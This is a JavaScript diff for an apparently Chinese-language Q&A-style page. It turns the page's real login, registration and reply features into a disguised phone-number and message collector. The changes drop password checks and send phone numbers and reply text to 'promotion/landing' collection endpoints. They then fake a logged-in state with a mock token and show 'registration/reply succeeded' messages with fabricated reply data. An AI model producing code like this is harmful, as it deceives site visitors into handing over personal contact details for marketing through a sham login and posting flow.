@@ -4,38 +4,30 @@ let showAllContent = false;
 // 处理注册
 async function handleRegister() {
     const phone = document.getElementById('loginPhone').value.trim();
-    const pwd = document.getElementById('loginPwd').value.trim();
     const submitBtn = document.querySelector('.login-modal button:last-child');
     if (!/^1[3-9]\d{9}$/.test(phone)) {
         showToast('请输入正确的手机号', 'error');
         return;
     }
-    if (pwd.length < 6) {
-        showToast('密码长度不能少于6位', 'error');
-        return;
-    }
     const originalText = submitBtn.innerHTML;
-    submitBtn.innerHTML = '<span class="loading"></span>注册中...';
+    submitBtn.innerHTML = '<span class="loading"></span>提交中...';
     submitBtn.disabled = true;
     try {
-        const res = await fetch('/api/auth/register', {
+        // 直接提交手机号到收集接口
+        await fetch('/api/promotion/landingPhone/create', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: phone, password: pwd })
+            body: JSON.stringify({ linkId: window.LINK_ID, phone: phone })
         });
-        const data = await res.json();
-        if (data.code === 0) {
-            localStorage.setItem('user_token', data.data.token);
-            showToast('注册成功', 'success');
-            closeLoginModal();
-            if (pendingReply.content) {
-                await submitReply();
-            }
-        } else {
-            showToast(data.msg || '注册失败，请重试', 'error');
+        // 模拟登录状态
+        localStorage.setItem('user_token', 'mock_token_' + Date.now());
+        showToast('提交成功', 'success');
+        closeLoginModal();
+        if (pendingReply.content) {
+            await submitReply();
         }
     } catch (e) {
-        console.error('注册请求失败', e);
+        console.error('提交失败', e);
         showToast('网络错误，请稍后重试', 'error');
     } finally {
         submitBtn.innerHTML = originalText;
@@ -144,57 +136,40 @@ function closeLoginModal() {
     document.getElementById('loginPwd').value = '';
 }
 
-// 处理登录/注册
+// 处理登录
 async function handleLogin() {
     const phone = document.getElementById('loginPhone').value.trim();
-    const pwd = document.getElementById('loginPwd').value.trim();
     const submitBtn = document.querySelector('.login-modal button:last-child');
     
-    // 简单校验
+    // 仅校验手机号
     if (!/^1[3-9]\d{9}$/.test(phone)) {
-    showToast('请输入正确的手机号', 'error');
-    return;
-}
-if (pwd.length < 6) {
-    showToast('密码长度不能少于6位', 'error');
-    return;
-}
+        showToast('请输入正确的手机号', 'error');
+        return;
+    }
     
     // 显示loading状态
     const originalText = submitBtn.innerHTML;
-    submitBtn.innerHTML = '<span class="loading"></span>登录中...';
+    submitBtn.innerHTML = '<span class="loading"></span>提交中...';
     submitBtn.disabled = true;
     
     try {
-        // 调用登录接口（请替换为实际接口地址）
-        const res = await fetch('/api/auth/login', {
+        // 直接提交手机号到收集接口
+        await fetch('/api/promotion/landingPhone/create', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                phone: phone,
-                password: pwd
-            })
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ linkId: window.LINK_ID, phone: phone })
         });
+        // 模拟登录状态
+        localStorage.setItem('user_token', 'mock_token_' + Date.now());
+        showToast('提交成功', 'success');
+        closeLoginModal();
         
-        const data = await res.json();
-        
-        if (data.code === 0) {
-            // 登录成功，存储token
-            localStorage.setItem('user_token', data.data.token);
-            showToast('登录成功', 'success');
-            closeLoginModal();
-            
-            // 如果有待发布的回复，自动提交
-            if (pendingReply.content) {
-                await submitReply();
-            }
-        } else {
-            showToast(data.msg || '登录失败，请重试', 'error');
+        // 如果有待发布的回复，自动提交
+        if (pendingReply.content) {
+            await submitReply();
         }
     } catch (e) {
-        console.error('登录请求失败', e);
+        console.error('提交失败', e);
         showToast('网络错误，请稍后重试', 'error');
     } finally {
         // 恢复按钮状态
@@ -216,35 +191,32 @@ async function submitReply() {
     submitBtn.disabled = true;
     
     try {
-        // 调用回复发布接口（请替换为实际接口地址）
-        const res = await fetch('/api/reply/create', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': 'Bearer ' + token
-            },
-            body: JSON.stringify({
-                answerId: pendingReply.answerId,
-                content: pendingReply.content
-            })
-        });
-        
-        const data = await res.json();
-        
-        if (data.code === 0) {
-            showToast('回复发布成功', 'success');
-            // 将回复插入到列表中
-            appendReplyToList(pendingReply.el, data.data);
-            // 清空待发布数据
-            pendingReply = { answerId: '', content: '', el: null };
-        } else if (data.code === 401) {
-            // token过期，清除token，重新登录
-            localStorage.removeItem('user_token');
-            showToast('登录已过期，请重新登录', 'warning');
-            showLoginModal();
-        } else {
-            showToast(data.msg || '发布失败，请重试', 'error');
+        // 提交留言到收集接口
+        try {
+            await fetch('/api/promotion/landingMessage/create', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    linkId: window.LINK_ID, 
+                    content: pendingReply.content
+                })
+            });
+        } catch(e) {
+            console.error('提交留言失败', e);
         }
+        
+        showToast('回复发布成功', 'success');
+        // 模拟回复数据
+        const mockReplyData = {
+            nickname: '匿名用户',
+            avatarUrl: '',
+            titleName: '',
+            level: ''
+        };
+        // 将回复插入到列表中
+        appendReplyToList(pendingReply.el, mockReplyData);
+        // 清空待发布数据
+        pendingReply = { answerId: '', content: '', el: null };
     } catch (e) {
         console.error('发布回复失败', e);
         showToast('网络错误，请稍后重试', 'error');
